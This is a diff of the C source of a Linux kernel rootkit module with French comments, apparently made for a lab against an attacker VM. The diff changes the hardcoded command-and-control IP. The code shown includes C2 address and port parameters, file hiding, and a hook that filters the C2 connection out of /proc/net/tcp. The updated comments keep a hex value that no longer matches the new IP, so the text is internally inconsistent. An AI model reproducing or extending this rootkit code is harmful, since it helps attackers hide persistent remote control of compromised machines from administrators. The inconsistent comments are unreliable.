@@ -235,7 +235,7 @@ MODULE_SOFTDEP("pre: libchacha20poly1305");
 
 static char *pw_hash = "";                  /* Hash SHA-256 du mot de passe (64 chars hex) */
 module_param(pw_hash, charp, 0400);
-static char *c2_ip = "192.168.122.96";      /* IP du serveur C2 (VM attaquante) */
+static char *c2_ip = "192.168.122.167";      /* IP du serveur C2 (VM attaquante) */
 static int c2_port = 9999;                  /* Port TCP du serveur C2 */
 module_param(c2_ip, charp, 0400);
 module_param(c2_port, int, 0400);
@@ -588,7 +588,7 @@ static void hide_files_exit(void)
  * ============================================================================
  *
  *  /proc/net/tcp affiche les connexions en format hexadecimal.
- *  Ex: port 9999 = 0x270F, IP 192.168.122.96 = 0x607AA8C0 (little-endian)
+ *  Ex: port 9999 = 0x270F, IP 192.168.122.167 = 0x607AA8C0 (little-endian)
  *  On prepare ces valeurs pour les filtrer dans le hook read.
  */
 
@@ -804,7 +804,7 @@ static void hide_lines_exit(void)
  *     0: 0100007F:270F 00000000:0000 ...
  *
  *  Les ports sont en hex (9999 = 270F).
- *  Les IPs sont en hex little-endian (192.168.122.96 = 607AA8C0).
+ *  Les IPs sont en hex little-endian (192.168.122.167 = 607AA8C0).
  *
  *  On convertit nos valeurs pour les reconnaitre dans le hook read.
  */
@@ -813,7 +813,7 @@ static void net_hide_init(void)
 {
     u32 ip_addr;
     snprintf(c2_port_hex, sizeof(c2_port_hex), "%04X", c2_port);
-    ip_addr = in_aton(c2_ip);  /* Convertir "192.168.122.96" en u32 */
+    ip_addr = in_aton(c2_ip);  /* Convertir "192.168.122.167" en u32 */
     snprintf(c2_ip_hex, sizeof(c2_ip_hex), "%08X", ip_addr);
     net_hide_ready = 1;
     printk(KERN_INFO "wlkom: net hiding ready (port=%s ip=%s)\n",
